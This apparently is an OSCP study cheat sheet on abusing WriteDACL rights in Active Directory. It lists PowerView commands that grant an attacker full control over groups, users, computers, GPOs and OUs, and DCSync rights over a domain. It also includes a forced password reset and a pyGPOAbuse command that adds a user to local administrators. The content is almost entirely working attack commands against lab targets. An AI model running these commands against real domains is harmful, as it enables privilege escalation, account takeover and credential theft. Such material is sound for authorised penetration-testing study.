# Abuse Info
With the ability to modify the DACL on the target object, you can grant yourself almost any privilege against the object you wish.

## Groups

With WriteDACL over a group, grant yourself the right to add members to the group:
```bash
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
```
See the abuse info for AddMembers edge for more information about execution the attack from there.


## Users
With WriteDACL over a user, grant yourself full control of the user object:
See the abuse info for GenericAll over a user for more information about how to continue from there.

```bash
# With WriteDACL over a user, grant yourself full control of the user object:
Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All

# Change the target user's password
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword
```

## Computers
With WriteDACL over a computer object, grant yourself full control of the computer object:
See the abuse info for GenericAll over a computer for more information about how to continue from there.

```bash
Add-DomainObjectAcl -TargetIdentity windows1 -Rights All
```

## Domains
With WriteDACL against a domain object, grant yourself the ability to DCSync:
Then perform the DCSync attack.

```bash
Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
```

## GPOs
![image](https://github.com/nuricheun/OSCP/assets/14031269/71cfd9d6-7d8f-4bb6-bde9-bfbdd9abcbcb)

With WriteDACL over a GPO, grant yourself full control of the GPO:
```bash
# With WriteDACL over a GPO, grant yourself full control of the GPO:
Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All

# https://github.com/Hackndo/pyGPOAbuse
# gpo-id can be found above(bloodhound)/gpo file path
python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f

```

Then edit the GPO to take over an object the GPO applies to.

OUs

With WriteDACL over an OU, grant yourself full control of the OU:

Add-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All
Then add a new ACE to the OU that inherits down to child objects to take over those child objects.
